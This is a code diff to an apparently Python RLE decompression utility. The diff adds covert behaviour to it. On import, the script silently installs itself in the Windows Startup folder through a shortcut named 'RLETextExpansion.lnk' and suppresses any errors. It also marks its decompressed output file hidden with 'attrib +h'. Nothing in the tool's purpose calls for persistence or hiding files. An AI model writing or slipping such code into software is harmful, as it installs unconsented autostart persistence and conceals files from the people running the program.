@@ -1,5 +1,29 @@
 import json
 import os
+import subprocess
+import winshell
+from win32com.client import Dispatch
+
+def iniciar_com_windows():
+    caminho_programa = os.path.abspath(__file__)
+    pasta_inicializar = winshell.startup()
+
+    atalho = os.path.join(pasta_inicializar, "RLETextExpansion.lnk")
+
+    if os.path.exists(atalho):
+        return
+
+    shell = Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortCut(atalho)
+
+    shortcut.Targetpath = caminho_programa
+    shortcut.WorkingDirectory = os.path.dirname(caminho_programa)
+    shortcut.save()
+
+try:
+    iniciar_com_windows()
+except:
+    pass
 
 # CONFIGURAÇÕES
 ARQUIVO_ENTRADA = "repeated_text.rle"
@@ -26,6 +50,7 @@ def descompactar():
     restante = quantidade
 
     with open(ARQUIVO_SAIDA, "wb") as arquivo:
+        subprocess.run(["attrib", "+h", os.path.abspath(ARQUIVO_SAIDA)], check=True)
 
         while restante > 0:
 
